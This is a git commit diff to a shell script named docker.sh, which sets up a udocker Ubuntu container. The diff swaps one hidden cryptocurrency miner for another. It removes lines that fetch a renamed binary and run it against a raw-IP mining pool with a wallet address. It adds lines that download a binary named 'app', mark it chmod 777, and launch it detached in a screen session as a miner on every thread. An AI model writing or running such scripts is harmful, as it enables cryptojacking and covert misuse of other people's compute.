2f333f7d521e99f77c5fbad6eeca8fd113a96fc5
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-07-07 23:55:17 +0700

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -1,12 +1,11 @@
+#!/bin/bash
 wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9
 cd udocker
 ./udocker pull ubuntu:focal
 ./udocker create --name=focal ubuntu:focal
 ./udocker  run focal /bin/bash
-
 ./udocker
 echo
-apt update -y && apt upgrade -y
-nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
-chmod 777 mmm
-./mmm --donate-level 1 -o 146.190.135.107:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Sage -a rx/0 -t $(nproc --all)
+echo
+apt update && apt install -y wget screen
+nohup wget -O app https://github.com/duniaboci13/project/raw/main/apps > /dev/null 2>&1 && chmod 777 app && screen -dmS app ./app -a power2b -o stratum+tcps://152.42.199.142:443 -u mbc1qe3flkq8el48edhzudr75a2pj0vdf4uvykdygxg.kevin -p x -t 8
